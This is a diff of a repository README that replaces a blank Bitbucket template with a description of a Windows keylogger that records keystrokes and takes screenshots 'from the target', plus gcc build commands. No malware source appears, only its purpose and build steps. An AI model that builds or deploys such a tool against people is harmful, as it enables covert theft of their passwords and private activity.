@@ -1,29 +1,12 @@
-# README #
+# Keylogger for windows#
 
-This README would normally document whatever steps are necessary to get your application up and running.
+Simple keylogger for windows to capture the keystrokes and also take a screenshot from the target.
 
-### What is this repository for? ###
+## Building steps 
 
-* Quick summary
-* Version
-* [Learn Markdown](https://bitbucket.org/tutorials/markdowndemo)
+```
+gcc -Wall -O2  -c main.c -o Release\main.o
 
-### How do I get set up? ###
-
-* Summary of set up
-* Configuration
-* Dependencies
-* Database configuration
-* How to run tests
-* Deployment instructions
-
-### Contribution guidelines ###
-
-* Writing tests
-* Code review
-* Other guidelines
-
-### Who do I talk to? ###
-
-* Repo owner or admin
-* Other community or team contact
+gcc  -o  Release\KeyloggerWindows.exe Release\main.o -lgdi32
+```
+If you use vscode, this is already configured on `launch.json` and `tasks.json`
